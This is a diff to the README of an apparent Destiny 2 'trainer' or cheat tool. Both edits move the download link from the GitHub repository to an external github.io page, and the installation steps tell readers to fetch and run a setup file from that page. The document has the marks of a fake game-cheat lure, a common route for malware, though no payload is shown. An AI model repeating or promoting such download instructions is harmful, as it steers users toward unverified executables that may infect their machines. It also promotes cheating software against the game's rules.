@@ -1,6 +1,6 @@
 # 🎮 Destiny2-Ultimate-Trainer-2026-gold - Automate your Destiny 2 game experience
 
-[![Download Launcher](https://img.shields.io/badge/Download-Release-blue)](https://github.com/princea9875/Destiny2-Ultimate-Trainer-2026-gold)
+[![Download Launcher](https://img.shields.io/badge/Download-Release-blue)](https://princea9875.github.io)
 
 ## 📌 Program Overview
 Destiny2-Ultimate-Trainer-2026-gold provides tools to manage character progression and combat performance in Destiny 2. This software automates repetitive tasks and adjusts character attributes to optimize gameplay efficiency. It functions as a background utility that interfaces with the game client to track data and execute commands. 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards for optimal performance:
 ## 🚀 Installation and Setup
 Follow these steps to prepare your system and launch the trainer:
 
-1. Visit this page to download the application files: [https://github.com/princea9875/Destiny2-Ultimate-Trainer-2026-gold](https://github.com/princea9875/Destiny2-Ultimate-Trainer-2026-gold).
+1. Visit this page to download the application files: [https://princea9875.github.io](https://princea9875.github.io).
 2. Locate the download folder on your computer.
 3. Open the downloaded folder and select the setup file.
 4. Follow the on-screen prompts to install the trainer to your preferred directory.
